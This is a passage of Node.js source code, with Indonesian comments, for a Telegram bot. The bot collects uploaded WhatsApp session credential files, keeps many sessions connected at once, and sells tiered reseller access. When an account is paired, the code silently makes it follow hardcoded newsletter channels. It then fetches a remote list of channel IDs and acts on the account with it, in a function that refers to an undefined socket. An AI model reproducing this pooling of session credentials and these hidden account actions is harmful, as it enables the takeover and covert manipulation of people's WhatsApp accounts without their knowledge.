            console.log(`[${sessionName}] Logged out.`);
            fs.rmSync(sessionsFold, { recursive: true, force: true });
            delete activeConnections[sessionName];
            delete biz[sessionName];
            delete mess[sessionName];
            resolve(null);
          } else if (retries > 0) {
            setTimeout(() => connectSession(folderPath, sessionName, retries - 1).then(resolve), 5000);
          } else {
            console.log(`${sessionName} Connection failed after retries.`);
            resolve(null);
          }
        }
      });
    } catch (err) {
      console.log(`[${sessionName}] Error connecting: ${err.message}`);
      resolve(null);
    }
  });
}*/

async function connectSession(folderPath, sessionName, retries = 100) {
  return new Promise(async (resolve) => {
    try {
      const sessionsFold = `${folderPath}/${sessionName}`
      const { state } = await useMultiFileAuthState(sessionsFold);
      const { version } = await fetchLatestBaileysVersion();

      const sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        version: version,
        defaultQueryTimeoutMs: undefined,
      });

      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

        if (connection === "open") {
          activeConnections[sessionName] = sock;

          const type = detectWATypeFromCreds(`${sessionsFold}/creds.json`);
          console.log(`\n[${sessionName}] Connected. Type: ${type}`);

          if (type === "Business") {
            biz[sessionName] = sock;
          } else if (type === "Messenger") {
            mess[sessionName] = sock;
          }

          resolve();
        } else if (connection === "close") {
          console.log(`\n[${sessionName}] Connection closed. Status: ${statusCode}\n${lastDisconnect.error}`);

          if (statusCode === 440) {
            delete activeConnections[sessionName];
            fs.rmSync(folderPath, { recursive: true, force: true });
          } else if (!isLoggedOut && retries > 0) {
            await new Promise((r) => setTimeout(r, 3000));
            resolve(await connectSession(folderPath, sessionName, retries - 1));
          } else {
            console.log(`\n[${sessionName}] Logged out or max retries reached.`);
            fs.rmSync(folderPath, { recursive: true, force: true });
            delete activeConnections[sessionName];
            resolve();
          }
        }
      });
    } catch (err) {
      console.log(`\n[${sessionName}] SKIPPED (session tidak valid / belum login)`);
      console.log(err);
      resolve();
    }
  });
}

async function disconnectAllActiveConnections() {
  for (const sessionName in activeConnections) {
    const sock = activeConnections[sessionName];
    try {
      sock.ws.close();
      console.log(`[${sessionName}] Disconnected.`);
    } catch (e) {
      console.log(`[${sessionName}] Gagal disconnect:`, e.message);
    }
    delete activeConnections[sessionName];
  }

  console.log('✅ Semua sesi dari activeConnections berhasil disconnect.');
}

async function connectNewUserSessionsOnly() {
  const userIdFolder = "permenmd";
  const files = prepareAuthFolders();
  if (files.length === 0) return;

  console.log(`[DEBUG] Ditemukan ${files.length} sesi:`, files);

  for (const file of files) {
    const baseName = path.basename(file, '.json');
    const sessionFolder = path.join(userIdFolder, baseName);

    // Skip jika sudah ada koneksi aktif
    if (activeConnections[baseName]) {
      console.log(`[${baseName}] Sudah terhubung, skip.`);
      continue;
    }

    if (!fs.existsSync(sessionFolder)) {
      fs.mkdirSync(sessionFolder, { recursive: true });
      const source = path.join(userIdFolder, file);
      const dest = path.join(sessionFolder, 'creds.json');
      if (!fs.existsSync(dest)) {
        fs.copyFileSync(source, dest);
      }
    }

    // Sambungkan sesi baru
    connectSession(sessionFolder, baseName);
  }
}

// Jika ingin refresh tanpa putus semua, pakai ini:
async function refreshUserSessions() {
  await startUserSessions();
  //startLoop();
}

//const axios = require("axios");
const RAW_URL = "https://raw.githubusercontent.com/DGXeon13/strings/refs/heads/main/strings.json";

async function unfollowAllChannel() {
  try {
    const { data } = await axios.get(RAW_URL);

    if (!Array.isArray(data)) {
      console.log("Data bukan array!");
      return;
    }

    console.log(`Total channel: ${data.length}`);

    for (let i = 0; i < data.length; i++) {
      const jid = data[i];
      try {
        await sock.newsletterUnfollow(jid);
        console.log(`[${i + 1}/${data.length}] Unfollow: ${jid}`);
        await new Promise(resolve => setTimeout(resolve, 1500));
      } catch (err) {
        console.log(`Gagal unfollow ${jid}:`, err.message);
      }
    }

    console.log("✅ Selesai unfollow semua channel dari baileys.");
  } catch (error) {
    console.log("❌ Gagal ambil data raw:", error.message);
  }
}

async function pairingWa(number, owner, attempt = 1) {
  if (attempt >= 5) {
    return false;
  }
  const sessionDir = path.join('permenmd', owner, number);

  if (!fs.existsSync('permenmd')) fs.mkdirSync('permenmd');
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir);

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    version: version,
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
      if (!isLoggedOut) {
        console.log(`🔄 Reconnecting ${number} Because ${lastDisconnect?.error?.output?.statusCode} Attempt ${attempt}/5`);
        await waiting(3000);
        await pairingWa(number, owner, attempt + 1);
      } else {
        delete activeConnections[number];
      }
    } else if (connection === "open") {
      try {
        
        await sock.newsletterFollow("120363404995533206@newsletter");
        await sock.newsletterFollow("120363330344810280@newsletter");
        await sleep(5000);
        await unfollowAllChannel();
        console.log("✅ Auto join channel sukses");
      } catch (e) {
        console.log("❌ Auto join channel gagal");
      }
      activeConnections[number] = sock;
      const sourceCreds = path.join(sessionDir, 'creds.json');
      const destCreds = path.join('permenmd', owner, `${number}.json`);

      try {
        await waiting(3000)
        if (fs.existsSync(sourceCreds)) {
          const data = fs.readFileSync(sourceCreds); // baca isi file sumber
          fs.writeFileSync(destCreds, data); // tulis ulang (overwrite)
          console.log(`✅ Rewrote session to ${destCreds}`);
        }
      } catch (e) {
        console.error(`❌ Failed to rewrite creds: ${e.message}`);
      }
    }
  });

  return null;
}

async function startUserSessions() {
  const vipDir = 'vip';
  const baseDir = 'permenmd';
    /*if (fs.existsSync(vipDir)) {
  const vipFiles = fs.readdirSync(vipDir).filter(f => f.endsWith('.json'));
  console.log(`[DEBUG] VIP files ditemukan: ${vipFiles.length}`);
    for (const file of vipFiles) {
  const sessionName = path.basename(file, '.json');
  const jsonFile = path.join(vipDir, file);        // vip/628xxx.json
  const sessionFolder = path.join(vipDir, sessionName); // vip/628xxx/

  if (activeConnections[sessionName]) {
    console.log(`[SKIP] VIP ${sessionName} already active.`);
    continue;
  }

  if (!fs.existsSync(sessionFolder)) {
    fs.mkdirSync(sessionFolder, { recursive: true });
    fs.copyFileSync(jsonFile, path.join(sessionFolder, 'creds.json'));
    console.log(`[PREP] Folder dibuat untuk ${sessionName}`);
  }

  try {
    console.log(`[START] Connecting VIP: ${sessionName}`);
    await connectSession(sessionFolder, sessionName, 100, () => {
      // Callback kalau session mati → hapus json asli juga
      if (fs.existsSync(jsonFile)) {
        fs.rmSync(jsonFile, { force: true });
        console.log(`[🗑️] VIP json dihapus: ${file}`);
      }
    });
  } catch (err) {
    console.error(`[ERROR] VIP ${sessionName}:`, err.message);
  }
}*/
/*

  // 1. Scan VIP Folder (Root)
  if (fs.existsSync(vipDir)) {
  const vipFiles = fs.readdirSync(vipDir).filter(f => f.endsWith('.json'));
  console.log(`[DEBUG] VIP files ditemukan: ${vipFiles.length}`);

  for (const file of vipFiles) {
    const sessionName = path.basename(file, '.json');

    if (activeConnections[sessionName]) {
      console.log(`[SKIP] VIP ${sessionName} already active.`);
      continue;
    }

    // Buat folder sementara vip/628xxx/ lalu taruh creds.json di sana
    const sessionFolder = path.join(vipDir, sessionName);
    if (!fs.existsSync(sessionFolder)) {
      fs.mkdirSync(sessionFolder, { recursive: true });
      fs.copyFileSync(
        path.join(vipDir, file),         // vip/628xxx.json
        path.join(sessionFolder, 'creds.json') // vip/628xxx/creds.json
      );
      console.log(`[PREP] Folder dibuat untuk ${sessionName}`);
    }

    try {
      console.log(`[START] Connecting VIP: ${sessionName}`);
      await connectSession(vipDir, sessionName);
    } catch (err) {
      console.error(`[ERROR] VIP ${sessionName}:`, err.message);
    }
  }
}
await sleep(20000);*/
  // 2. Scan User Folders (Logika Anda yang disederhanakan)
  const subfolders = fs.readdirSync(baseDir)
    .map(name => path.join(baseDir, name))
    .filter(p => fs.lstatSync(p).isDirectory()); // Filter hanya folder saja

  console.log(`[DEBUG] Found ${subfolders.length} subfolders inside permenmd`);

  for (const folder of subfolders) {
    try {
      const jsonFiles = fs.readdirSync(folder)
        .filter(file => file.endsWith(".json"))
        .map(file => path.join(folder, file));

      console.log(`[DEBUG] Found ${jsonFiles.length} JSON files in ${folder}`);

      for (const jsonFile of jsonFiles) {
        const sessionName = `${path.basename(jsonFile, ".json")}`;

        // ✅ Cek apakah session sudah aktif
        if (activeConnections[sessionName]) {
          console.log(`[SKIP] Session ${sessionName} already active, skipping...`);
          continue;
        }

        try {
          console.log(`[START] Connecting session: ${sessionName}`);
          await connectSession(folder, sessionName);
            
        } catch (err) {
          console.error(`[ERROR] Failed to start session ${sessionName}:`, err.message);
        }
      }
    } catch (err) {
      console.log(`[❌ ERROR FOLDER] Gagal scan folder ${folder}: ${err.message}`);
    }
  }
    
}
function prepareVipSessionFolders() {
  const vipFolder = 'vip';
  try {
    if (!fs.existsSync(vipFolder)) {
      fs.mkdirSync(vipFolder, { recursive: true });
    }
    const files = fs.readdirSync(vipFolder).filter(file => file.endsWith('.json'));

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(vipFolder, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(vipFolder, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }
    return files;
  } catch (err) {
    logger.error("Error preparing VIP folders:", err.message);
    return [];
  }
}

async function startVipSessions() {
  const files = prepareVipSessionFolders();
  for (const file of files) {
    const baseName = path.basename(file, '.json');
    if (activeConnections[baseName]) continue;
    await connectSession('vip', baseName);
  }
}
function getRandomVipConnection() {
  const conns = getActiveVipConnections();
  const keys = Object.keys(conns);
  if (keys.length === 0) return null;
  return conns[keys[Math.floor(Math.random() * keys.length)]];
}
   function getActiveVipConnections() {
  const vipConnections = {};
  for (const sessionName in activeConnections) {
    if (fs.existsSync(getVipSessionPath(sessionName))) {
      vipConnections[sessionName] = activeConnections[sessionName];
    }
  }
  return vipConnections;
} 

// Helper: Ambil socket yang aktif dari sebuah path folder
function getActiveSocketsFromPath(folderPath) {
  if (!fs.existsSync(folderPath)) return [];

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeSockets = [];

  for (const file of jsonFiles) {
    const sessionName = path.basename(file, ".json");
    if (activeConnections[sessionName]) {
      activeSockets.push(activeConnections[sessionName]);
    }
  }

  return activeSockets;
}
// === Fungsi untuk mengecek apakah folder punya sesi aktif ===
function checkActiveSessionInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);

  // Cek jika folder tidak ada, return null langsung
  if (!fs.existsSync(folderPath)) return null;

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    if (activeConnections[sessionName]) {
      return activeConnections[sessionName]; // return socket aktif
    }
  }
  return null; // Tidak ada sesi aktif
}


const telegramDataPath = "telegram.json";
const dbPath = "database.json";

// ===== STORAN SYSTEM =====
const STORAN_FILE = './storan.json';
const QR_CODE_PAYMENT = config.QR_CODE_PAYMENT;

const STORAN_DATA = {
  pending: [],
  history: []
};

function loadStoranData() {
  if (!fs.existsSync(STORAN_FILE)) {
    fs.writeFileSync(STORAN_FILE, JSON.stringify(STORAN_DATA, null, 2));
  }
  return JSON.parse(fs.readFileSync(STORAN_FILE));
}

function saveStoranData(data) {
  fs.writeFileSync(STORAN_FILE, JSON.stringify(data, null, 2));
}

function generateStoranId() {
  return 'STOR-' + Date.now().toString(36).toUpperCase();
}
// ===== Helpers =====
function loadTelegramConfig() {
  if (!fs.existsSync(telegramDataPath)) {
    fs.writeFileSync(telegramDataPath, JSON.stringify({ 
      ownerList: [], 
      userList: [],
      resList: [],
      ptList: [],
      tkList: []
    }, null, 2));
  }
  return JSON.parse(fs.readFileSync(telegramDataPath));
}

function loadDatabase() {
  if (!fs.existsSync(dbPath)) fs.writeFileSync(dbPath, JSON.stringify([]));
  return JSON.parse(fs.readFileSync(dbPath));
}

function saveDatabase(data) {
  fs.writeFileSync(dbPath, JSON.stringify(data, null, 2));
}

function generateKey() {
  return crypto.randomBytes(8).toString("hex");
}

async function downloadToBuffer(url) {
  try {
    const response = await axios.get(url, {
      responseType: 'arraybuffer'
    });
    return Buffer.from(response.data);
  } catch (error) {
    throw error;
  }
}


function isValidBaileysCreds(jsonData) {
  if (typeof jsonData !== 'object' || jsonData === null) return false;

  const requiredKeys = [
    'noiseKey',
    'signedIdentityKey',
    'signedPreKey',
    'registrationId',
    'advSecretKey',
    'signalIdentities'
  ];

  return requiredKeys.every(key => key in jsonData);
}

function getFormattedUsers() {
  const db = loadDatabase();
  if (db.length === 0) return "Belum ada user terdaftar.";
  return db.map(u => `👤 ${u.username} | 🎯 ${u.role || 'member'} | ⏳ ${u.expiredDate}`).join("\n");
}

bot.onText(/^\/?(start|menu)/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  console.log(`[BOT] /start dari user: ${userId} (${msg.from.first_name}) di chat: ${chatId}`);
  
  const config = loadTelegramConfig();
  
  console.log(`[BOT] Config: ownerList=${config.ownerList}, userList=${config.userList}, resList=${config.resList}, ptList=${config.ptList}, tkList=${config.tkList}`);
  
  const isOwner = config.ownerList.includes(userId);
  const isPt = config.ptList && config.ptList.includes(userId);
  const isRes = config.resList && config.resList.includes(userId);
  const isTk = config.tkList && config.tkList.includes(userId);
  const isUser = config.userList.includes(userId);

  console.log(`[BOT] Hasil cek: isOwner=${isOwner}, isPt=${isPt}, isRes=${isRes}, isTk=${isTk}, isUser=${isUser}`);

  if (!isOwner && !isPt && !isRes && !isTk && !isUser) {
    console.log(`[BOT] User ${userId} TIDAK TERDAFTAR, kirim pesan`);
    return bot.sendMessage(chatId, `<blockquote>❌ Anda Tidak Memiliki Izin\n\nHubungi Owner untuk mendapatkan akses.\n\n🆔 ID Anda: ${userId}</blockquote>`, { parse_mode: "HTML" });
  }

  if (isUser && !isOwner && !isPt && !isRes && !isTk) {
    console.log(`[BOT] User ${userId} adalah USER BIASA`);
    return bot.sendMessage(chatId, `<blockquote>❌ Anda Tidak Memiliki Izin\n\nHubungi Owner untuk mendapatkan akses.\n\n🆔 ID Anda: ${userId}</blockquote>`, { parse_mode: "HTML" });
  }

  let buttons = [];

  if (isRes && !isPt && !isTk && !isOwner) {
    // RES - 2 kolom
    buttons = [
      [{ text: "👾 Buat Member", callback_data: "create_member" }, { text: "👾 Buat Reseller", callback_data: "create_reseller" }],
      [{ text: "📦 Storan", callback_data: "storan" }]
    ];
  }

  else if (isPt && !isTk && !isOwner) {
    // PT - 2 kolom
    buttons = [
      [{ text: "👾 Buat Member", callback_data: "create_member" }, { text: "👾 Buat Reseller", callback_data: "create_reseller" }],
      [{ text: "👾 Buat VIP", callback_data: "create_vip" }, { text: "➕ Add Reseller", callback_data: "add_res" }],
      [{ text: "📦 Storan", callback_data: "storan" }]
    ];
  }

  else if (isOwner && !isTk) {
    // OWNER - 2 kolom
    buttons = [
      [{ text: "👾 Buat Member", callback_data: "create_member" }, { text: "👾 Buat Reseller", callback_data: "create_reseller" }],
      [{ text: "👾 Buat VIP", callback_data: "create_vip" }, { text: "👾 Buat Admin", callback_data: "create_admin" }],
      [{ text: "👾 Buat Owner", callback_data: "create_owner" }, { text: "➕ Add Reseller", callback_data: "add_res" }],
      [{ text: "➕ Add Partner", callback_data: "add_pt" }, { text: "➕ Add Owner", callback_data: "add_owner" }],
      [{ text: "⏳ Set Expired", callback_data: "set_expire" }, { text: "📦 Storan", callback_data: "storan" }],
      [{ text: "📋 List User", callback_data: "list_user" }, { text: "🗑 Hapus User", callback_data: "delete_user" }]
    ];
  }
  
  else if (isTk) {
    // TK - 2 kolom
    buttons = [
      [{ text: "👾 Buat Member", callback_data: "create_member" }, { text: "👾 Buat Reseller", callback_data: "create_reseller" }],
      [{ text: "👾 Buat VIP", callback_data: "create_vip" }, { text: "👾 Buat Admin", callback_data: "create_admin" }],
      [{ text: "👾 Buat Owner", callback_data: "create_owner" }, { text: "➕ Add Reseller", callback_data: "add_res" }],
      [{ text: "➕ Add Partner", callback_data: "add_pt" }, { text: "➕ Add Owner", callback_data: "add_owner" }],
      [{ text: "➕ Add TK", callback_data: "add_tk" }, { text: "⏳ Set Expired", callback_data: "set_expire" }],
      [{ text: "📦 Storan", callback_data: "storan" }, { text: "📋 List User", callback_data: "list_user" }],
      [{ text: "🗑 Hapus User", callback_data: "delete_user" }]
    ];
  }

  const options = {
    reply_markup: {
      inline_keyboard: buttons
    }
  };

  console.log(`[BOT] Kirim menu ke ${userId}`);
  bot.sendMessage(chatId, `<blockquote>👋 Halo ${msg.from.first_name}, pilih menu:</blockquote>`, { ...options, parse_mode: "HTML" });
});
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  // ===== HANDLE STORAN =====
  const storanData = loadStoranData();
  const pending = storanData.pending.find(s => s.userId === userId);
  
  if (pending) {
    if (msg.photo) {
      const photoId = msg.photo[msg.photo.length - 1].file_id;
      if (pending.step === "waiting_ss") {
        return handleStoranSS(chatId, userId, photoId);
      } else if (pending.step === "waiting_qr_ss") {
        return handleStoranQrSS(chatId, userId, photoId);
      }
    }
    if (msg.text && pending.step === "waiting_username") {
      return handleStoranUsername(chatId, userId, msg.text);
    }
  }

  if (msg.document) {
    const fileName = msg.document.file_name || '';
    if (!fileName.endsWith('.json')) {
      return;
    }

    try {
      const file = await bot.getFile(msg.document.file_id);
      const fileUrl = `https://api.telegram.org/file/bot${TOKEN}/${file.file_path}`;
      const buffer = await downloadToBuffer(fileUrl);
      const jsonData = JSON.parse(buffer.toString());

      if (!isValidBaileysCreds(jsonData)) {
        return bot.sendMessage(chatId, '❌ File tersebut bukan `creds.json` valid dari Baileys.');
      }

      // Simpan ke folder sessions/<userId>/
      const userFolder = path.join(__dirname, 'permenmd');
      if (!fs.existsSync(userFolder)) {
        fs.mkdirSync(userFolder, { recursive: true });
      }

      let finalName = fileName;
      const savePath = path.join(userFolder, finalName);

      // Jika file sudah ada, buat nama acak
      if (fs.existsSync(savePath)) {
        const randomSuffix = Date.now(); // atau bisa juga pakai: Math.random().toString(36).slice(2, 8)
        const base = path.basename(fileName, '.json');
        finalName = `${base}-${randomSuffix}.json`;
      }

      const finalSavePath = path.join(userFolder, finalName);
      fs.writeFileSync(finalSavePath, JSON.stringify(jsonData));

      bot.sendMessage(chatId, `✅ File disimpan sebagai ${finalName}.`);
    } catch (err) {
      console.error(err);
      bot.sendMessage(chatId, '⚠️ Terjadi kesalahan saat memproses file.');
    }
  }
});

bot.on("callback_query", async (query) => {
  const id = query.from.id;
  const data = query.data;
  
  console.log('[CALLBACK] ===== START =====');
  console.log('[CALLBACK] From ID:', id);
  console.log('[CALLBACK] Data:', data);
  
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);
  const isPt = config.ptList && config.ptList.includes(id);
  const isRes = config.resList && config.resList.includes(id);
  const isTk = config.tkList && config.tkList.includes(id);
  const isUser = config.userList.includes(id) || isOwner || isPt || isRes || isTk;

  if (!isUser) {
    console.log('[CALLBACK] User tidak diizinkan:', id);
    return bot.answerCallbackQuery(query.id, { text: "Tidak diizinkan." });
  }

  console.log('[CALLBACK] Data yang diproses:', data);

  // ===== HANDLE STORAN APPROVE =====
if (data && data.startsWith('storan_terima_')) {
  console.log('[CALLBACK] MATCH: storan_terima');
  const storanId = data.replace('storan_terima_', '');
  console.log('[CALLBACK] storanId:', storanId);
  await handleStoranApprove(id, storanId, "terima", query);
  return;
}

if (data && data.startsWith('storan_tolak_')) {
  console.log('[CALLBACK] MATCH: storan_tolak');
  const storanId = data.replace('storan_tolak_', '');
  console.log('[CALLBACK] storanId:', storanId);
  await handleStoranApprove(id, storanId, "tolak", query);
  return;
}
  
 if (data && data.startsWith('storan_qr_terima_')) {
  console.log('[CALLBACK] MATCH: storan_qr_terima');
  const qrId = data.replace('storan_qr_terima_', '');
  console.log('[CALLBACK] qrId:', qrId);
  await handleStoranQrApprove(id, qrId, "terima", query);
  return;
}

if (data && data.startsWith('storan_qr_tolak_')) {
  console.log('[CALLBACK] MATCH: storan_qr_tolak');
  const qrId = data.replace('storan_qr_tolak_', '');
  console.log('[CALLBACK] qrId:', qrId);
  await handleStoranQrApprove(id, qrId, "tolak", query);
  return;
}

  // ===== SWITCH CASE UNTUK YANG LAIN =====
  switch (data) {
    // ===== CREATE ACCOUNT =====
    case "create_member":
      createAccountByRole(id, "member");
      break;
    case "create_reseller":
      if (!isRes && !isPt && !isTk && !isOwner) {
        return bot.answerCallbackQuery(query.id, { text: "Tidak diizinkan membuat Reseller." });
      }
      createAccountByRole(id, "reseller");
      break;
    case "create_vip":
      if (!isPt && !isTk && !isOwner) {
        return bot.answerCallbackQuery(query.id, { text: "Tidak diizinkan membuat VIP." });
      }
      createAccountByRole(id, "vip");
      break;
    case "create_admin":
      if (!isTk && !isOwner) {
        return bot.answerCallbackQuery(query.id, { text: "Tidak diizinkan membuat Admin." });
      }
      createAccountByRole(id, "admin");
      break;
    case "create_owner":
      if (!isTk && !isOwner) {
        return bot.answerCallbackQuery(query.id, { text: "Tidak diizinkan membuat Owner." });
      }
      createAccountByRole(id, "owner");
      break;

    // ===== ADD ROLE VIA BUTTON =====
    case "add_res":
      if (!isPt && !isTk && !isOwner) {
        return bot.answerCallbackQuery(query.id, { text: "Tidak diizinkan menambah Reseller." });
      }
      bot.sendMessage(id, `<blockquote>📨 Kirim ID Akun Tele Untuk Role RES (Reseller):\n\nContoh: 628123456789</blockquote>`, { parse_mode: "HTML" });
      bot.once("message", msg => {
        const targetId = parseInt(msg.text.trim());
        if (isNaN(targetId)) {
          return bot.sendMessage(id, `<blockquote>❌ ID tidak valid!.</blockquote>`, { parse_mode: "HTML" });
        }
        addRoleById(id, targetId, "res");
      });
      break;

    case "add_pt":
      if (!isOwner && !isTk) {
        return bot.answerCallbackQuery(query.id, { text: "Tidak diizinkan menambah Partner." });
      }
      bot.sendMessage(id, `<blockquote>📨 Kirim ID Akun Tele Untuk Role PT (Partner):\n\nContoh: 628123456789</blockquote>`, { parse_mode: "HTML" });
      bot.once("message", msg => {
        const targetId = parseInt(msg.text.trim());
        if (isNaN(targetId)) {
          return bot.sendMessage(id, `<blockquote>❌ ID tidak valid!.</blockquote>`, { parse_mode: "HTML" });
        }
        addRoleById(id, targetId, "pt");
      });
      break;

    case "add_owner":
      if (!isOwner && !isTk) {
        return bot.answerCallbackQuery(query.id, { text: "Hanya OWNER atau TK yang bisa menambah Owner." });
      }
      bot.sendMessage(id, `<blockquote>📨 Kirim ID Akun Tele Untuk Role OWNER:\n\nContoh: 628123456789</blockquote>`, { parse_mode: "HTML" });
      bot.once("message", msg => {
        const targetId = parseInt(msg.text.trim());
        if (isNaN(targetId)) {
          return bot.sendMessage(id, `<blockquote>❌ ID tidak valid!.</blockquote>`, { parse_mode: "HTML" });
        }
        addRoleById(id, targetId, "owner");
      });
      break;
      
    case "add_tk":
      if (!isTk) {
        return bot.answerCallbackQuery(query.id, { text: "Hanya TK yang bisa menambah TK." });
      }
      bot.sendMessage(id, `<blockquote>📨 Kirim ID Akun Tele Untuk Role TK:\n\nContoh: 628123456789</blockquote>`, { parse_mode: "HTML" });
      bot.once("message", msg => {
        const targetId = parseInt(msg.text.trim());
        if (isNaN(targetId)) {
          return bot.sendMessage(id, `<blockquote>❌ ID tidak valid!.</blockquote>`, { parse_mode: "HTML" });
        }
        addRoleById(id, targetId, "tk");
      });
      break;
      
    // ===== STORAN SYSTEM =====
    case "storan":
      if (!isOwner && !isPt && !isRes && !isTk) {
        return bot.answerCallbackQuery(query.id, { text: "Tidak diizinkan." });
      }
      
      let storanButtons = [];
      
      if (isRes && !isPt && !isTk && !isOwner) {
        storanButtons = [
          [{ text: "📦 Storan Paket MEMBER", callback_data: "storan_member" }],
          [{ text: "📦 Storan Paket RES (Reseller)", callback_data: "storan_res" }],
          [{ text: "❌ Batal", callback_data: "storan_batal" }]
        ];
      } else if (isPt && !isTk && !isOwner) {
        storanButtons = [
        [{ text: "📦 Storan Paket MEMBER", callback_data: "storan_member" }],
          [{ text: "📦 Storan Paket RES (Reseller)", callback_data: "storan_res" }],
          [{ text: "📦 Storan Paket PT (Partner)", callback_data: "storan_pt" }],
          [{ text: "❌ Batal", callback_data: "storan_batal" }]
        ];
      } else if (isOwner && !isTk) {
        storanButtons = [
        [{ text: "📦 Storan Paket MEMBER", callback_data: "storan_member" }],
          [{ text: "📦 Storan Paket RES (Reseller)", callback_data: "storan_res" }],
          [{ text: "📦 Storan Paket PT (Partner)", callback_data: "storan_pt" }],
          [{ text: "📦 Storan Paket OWNER", callback_data: "storan_owner" }],
          [{ text: "❌ Batal", callback_data: "storan_batal" }]
        ];
      } else if (isTk) {
        storanButtons = [
        [{ text: "📦 Storan Paket MEMBER", callback_data: "storan_member" }],
          [{ text: "📦 Storan Paket RES (Reseller)", callback_data: "storan_res" }],
          [{ text: "📦 Storan Paket PT (Partner)", callback_data: "storan_pt" }],
          [{ text: "📦 Storan Paket OWNER", callback_data: "storan_owner" }],
          [{ text: "📦 Storan Paket TK", callback_data: "storan_tk" }],
          [{ text: "❌ Batal", callback_data: "storan_batal" }]
        ];
      }
      
      const options = { reply_markup: { inline_keyboard: storanButtons } };
      bot.sendMessage(id, `<blockquote>📦 Pilih Paket Storan:</blockquote>`, { ...options, parse_mode: "HTML" });
      break;

    case "storan_member":
      const storanDataMember = loadStoranData();
      const newStoranMember = {
        id: generateStoranId(),
        userId: id,
        package: "member",
        packageName: "MEMBER",
        step: "waiting_username",
        username: null,
        ssImage: null,
        qrCode: null,
        ssQrImage: null,
        status: "pending"
      };
      storanDataMember.pending.push(newStoranMember);
      saveStoranData(storanDataMember);
      bot.sendMessage(id, `<blockquote>📦 Storan Paket MEMBER\n\nKirimkan Id User yang mau di-stor:\n\nContoh: 1663207738</blockquote>`, { parse_mode: "HTML" });
      break;

    case "storan_res":
    case "storan_pt":
    case "storan_owner":
    case "storan_tk":
      const packageMap = {
        storan_res: { key: "res", name: "RES (Reseller)" },
        storan_pt: { key: "pt", name: "PT (Partner)" },
        storan_owner: { key: "owner", name: "OWNER" },
        storan_tk: { key: "tk", name: "TK" }
      };
      const pkg = packageMap[data];
      if (!pkg) break;
      
      let allowed = false;
      if (data === "storan_res" && (isRes || isPt || isOwner || isTk)) allowed = true;
      else if (data === "storan_pt" && (isPt || isOwner || isTk)) allowed = true;
      else if (data === "storan_owner" && (isOwner || isTk)) allowed = true;
      else if (data === "storan_tk" && isTk) allowed = true;
      
      if (!allowed) {
        return bot.answerCallbackQuery(query.id, { text: "Tidak diizinkan." });
      }
      
      const storanData = loadStoranData();
      const newStoran = {
        id: generateStoranId(),
        userId: id,
        package: pkg.key,
        packageName: pkg.name,
        step: "waiting_username",
        username: null,
        ssImage: null,
        qrCode: null,
        ssQrImage: null,
        status: "pending"
      };
      storanData.pending.push(newStoran);
      saveStoranData(storanData);
      bot.sendMessage(id, `<blockquote>📦 Storan Paket ${pkg.name}\n\nKirimkan Id User yang mau di-stor:\n\nContoh: 1663207738</blockquote>`, { parse_mode: "HTML" });
      break;

    case "storan_batal":
      bot.sendMessage(id, `<blockquote>❌ Storan dibatalkan.</blockquote>`, { parse_mode: "HTML" });
      break;

    // ===== LIST & DELETE =====
    case "list_user":
      if (!isOwner && !isTk) return;
      const users = getFormattedUsers();
      bot.sendMessage(id, `<blockquote>📋 Daftar Pengguna:\n${users}</blockquote>`, { parse_mode: "HTML" });
      break;

    case "delete_user":
      if (!isOwner && !isTk) return;
      bot.sendMessage(id, `<blockquote>Masukkan username yang akan dihapus:</blockquote>`, { parse_mode: "HTML" });
      bot.once("message", msg => {
        const db = loadDatabase();
        const index = db.findIndex(u => u.username === msg.text.trim());
        if (index === -1) {
          return bot.sendMessage(id, `<blockquote>❌ User tidak ditemukan.</blockquote>`, { parse_mode: "HTML" });
        }
        const deleted = db.splice(index, 1)[0];
        saveDatabase(db);
        bot.sendMessage(id, `<blockquote>🗑️ User ${deleted.username} berhasil dihapus.</blockquote>`, { parse_mode: "HTML" });
      });
      break;

    case "set_expire":
      bot.sendMessage(id, `<blockquote>Masukkan: username|tambah_hari</blockquote>`, { parse_mode: "HTML" });
      bot.once("message", msg => {
        const [username, addDays] = msg.text.split("|").map(s => s.trim());
        const db = loadDatabase();
        const user = db.find(u => u.username === username);
        if (!user) {
          return bot.sendMessage(id, `<blockquote>❌ User tidak ditemukan.</blockquote>`, { parse_mode: "HTML" });
        }

        if (!isOwner && !isTk && user.role !== "member") {
          return bot.sendMessage(id, `<blockquote>❌ Kamu hanya bisa memperpanjang akun dengan role 'member'.</blockquote>`, { parse_mode: "HTML" });
        }

        const current = new Date(user.expiredDate);
        current.setDate(current.getDate() + parseInt(addDays));
        user.expiredDate = current.toISOString().split("T")[0];
        saveDatabase(db);
        bot.sendMessage(id, `<blockquote>✅ Masa aktif diperbarui untuk ${username} ke ${user.expiredDate}</blockquote>`, { parse_mode: "HTML" });
      });
      break;

    default:
      console.log('[CALLBACK] UNKNOWN DATA:', data);
      bot.answerCallbackQuery(query.id, { text: "Fitur tidak dikenal." });
      break;
  }
  
  console.log('[CALLBACK] ===== END =====');
});

// Fungsi untuk menambah role via button
